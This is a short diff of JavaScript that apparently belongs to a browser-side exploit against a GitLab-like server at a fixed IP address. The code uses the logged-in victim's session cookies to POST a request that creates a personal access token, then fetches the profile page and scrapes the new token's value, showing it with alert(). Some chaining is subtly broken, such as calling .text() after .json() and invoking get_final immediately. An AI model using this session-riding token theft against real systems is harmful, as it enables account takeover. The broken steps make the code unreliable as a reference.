@@ -1,3 +1,14 @@
+function get_final() {
+  fetch("https://65.52.77.188/-/profile/personal_access_tokens").then(response => response.json())
+  .then(response => response.text())
+  .then(text => {
+    const parser = new DOMParser();
+    const htmlDocument = parser.parseFromString(text, "text/html");
+    const val = htmlDocument.documentElement.querySelector("input[name='created-personal-access-token']").value
+    alert(val);
+  });
+}
+
 function get_access(token) {
   fetch("https://65.52.77.188/-/profile/personal_access_tokens", {
   "headers": {
@@ -20,8 +31,7 @@ function get_access(token) {
   "method": "POST",
   "mode": "cors",
   "credentials": "include"
-}).then(response => response.json())
-  .then(data => alert(data));
+}).then(get_final());
 }
 function get_token() {
   var xhr = new XMLHttpRequest();
